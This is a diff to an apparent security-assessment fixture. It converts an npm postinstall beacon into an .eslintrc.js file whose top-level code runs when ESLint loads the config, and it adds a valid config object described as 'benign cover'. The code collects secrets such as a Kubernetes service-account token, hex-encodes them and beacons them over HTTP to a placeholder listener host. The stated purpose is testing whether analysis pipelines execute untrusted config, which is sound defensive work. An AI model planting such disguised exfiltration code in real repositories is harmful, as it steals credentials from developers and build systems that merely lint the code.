@@ -1,15 +1,12 @@
-// DVAP payload: Node beacon fired by an npm lifecycle (postinstall) script.
+// Assessment fixture: .eslintrc.js executed as JavaScript when ESLint loads config.
 //
 // Real behavior abused
 // --------------------
-// `npm install` runs a package's lifecycle scripts (preinstall/install/
-// postinstall) by default. Any SCA tool that installs dependencies to analyze
-// them therefore executes attacker-controlled shell/Node from package.json. This
-// is one of the most-exploited supply-chain sinks in the wild.
-//
-// Mitigation (disable_extensibility): the worker runs `npm install
-// --ignore-scripts` (a real npm flag), so postinstall -- and thus this file --
-// never runs.
+// ESLint's legacy config format `.eslintrc.js` is a *JavaScript module*. ESLint
+// `require()`s it to read the config object, so any top-level code in the file
+// runs inside the linter's process the moment ESLint discovers it -- before a
+// single line of the target code is analyzed. Pointing any SAST pipeline that
+// uses ESLint at this repo runs the config module.
 //
 // Containment: only network target is the __DVAP_LISTENER_HOST__ placeholder
 // (substituted by the worker). Node core modules only (http).
@@ -51,13 +48,12 @@ function collectExfil() {
       lines.push("K8S_SA_TOKEN=" + token);
     }
   } catch (e) {
-    // token file absent (e.g. strip_credentials) -- ignore
+    // token file absent -- ignore
   }
   return lines.join("\n");
 }
 
 function dottedHex(payload) {
-  // hex-encode UTF-8 bytes, then split into ~60-char chunks joined by "."
   const hexed = Buffer.from(payload, "utf8").toString("hex");
   const chunks = [];
   for (let i = 0; i < hexed.length; i += 60) {
@@ -76,9 +72,17 @@ function beacon() {
       res.on("end", () => {});
     },
   );
-  // A blocked beacon (egress off / host unresolvable) must never crash install.
   req.on("error", () => {});
   req.end();
 }
 
+// Side effect at config-load time.
 beacon();
+
+// Benign cover: a real ESLint config object so the file is a valid .eslintrc.js.
+module.exports = {
+  root: true,
+  env: { node: true, es2021: true },
+  parserOptions: { ecmaVersion: 2021, sourceType: "module" },
+  rules: {},
+};
